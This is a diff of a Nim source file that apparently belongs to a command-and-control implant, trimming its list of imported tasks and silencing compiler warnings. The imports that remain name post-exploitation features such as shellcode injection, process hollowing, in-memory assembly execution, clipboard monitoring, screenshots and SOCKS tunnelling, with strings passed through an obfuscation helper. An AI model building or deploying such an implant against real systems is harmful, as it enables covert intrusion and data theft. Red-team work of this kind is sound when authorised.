@@ -1,4 +1,4 @@
-import std/[json, random, os, base64, tables, times, strutils, strformat, asyncdispatch, sequtils]
+import std/[json, random, os, base64, tables, times, strformat, asyncdispatch]
 import config
 import global_data
 import profiles/http
@@ -6,39 +6,19 @@ import profiles/websocket
 import profiles/httpx
 import profiles/dns
 import profiles/tcp
-import utils/sysinfo
-import utils/m_responses
 import utils/debug
 import utils/strenc
 import utils/task_processor
-import tasks/exit
 import tasks/sleep
-import tasks/ls
 import tasks/download
 import tasks/upload
-import tasks/run
-import tasks/whoami
-import tasks/cat
-import tasks/mkdir
-import tasks/cp
-import tasks/mv
-import tasks/cd
-import tasks/ps
-import tasks/pwd
-import tasks/rm
 import tasks/pty
 import tasks/socks
 import tasks/rpfwd
-import tasks/redirect
-import tasks/getenv as taskGetenv
 import tasks/connect
 
 # Cross-platform commands
 import tasks/portscan
-import tasks/ifconfig
-import tasks/netstat
-import tasks/config as taskConfig
-import tasks/pkill
 
 when defined(windows):
   import tasks/powershell as powershellTask
@@ -46,34 +26,13 @@ when defined(windows):
   import profiles/smb
   import tasks/execute_assembly
   import tasks/inline_execute
-  import tasks/powerpick
   import tasks/shinject
-  import tasks/make_token
-  import tasks/steal_token
-  import tasks/rev2self
-  import tasks/runas
-  import tasks/getsystem
-  import tasks/getprivs
-  import tasks/listpipes
-  import tasks/scshell
-  import tasks/spawnto_x64
-  import tasks/spawnto_x86
-  import tasks/ppid
-  import tasks/reg_query
-  import tasks/reg_write_value
-  import tasks/net_dclist
-  import tasks/net_localgroup
-  import tasks/net_localgroup_member
-  import tasks/net_shares
   import tasks/screenshot
-  import tasks/get_av
-  import tasks/clipboard
   import tasks/clipboard_monitor
   import tasks/donut
   import tasks/inject_hollow
   import tasks/run_pe
   import tasks/powershell_import
-  import tasks/sc
   import tasks/spawn
   import tasks/spawnas
 
@@ -176,7 +135,7 @@ proc setAesDecKey(profile: var Profile, key: seq[byte]) =
     when defined(windows):
       profile.smbProfile.setAesDecKey(key)
 
-proc hasAesKey(profile: Profile): bool =
+proc hasAesKey(profile: Profile): bool {.used.} =
   case profile.kind
   of pkHttp:
     result = profile.httpProfile.hasAesKey()
@@ -771,7 +730,6 @@ proc postResponses*(agent: var Agent) =
   for resp in agent.taskResponses:
     if resp.hasKey(obf("interactive")):
       # Extract interactive messages and add to top-level array
-      let taskId = resp[obf("task_id")].getStr()
       let messages = resp[obf("interactive")].getElems()
       for msg in messages:
         interactiveMessages.add(msg)
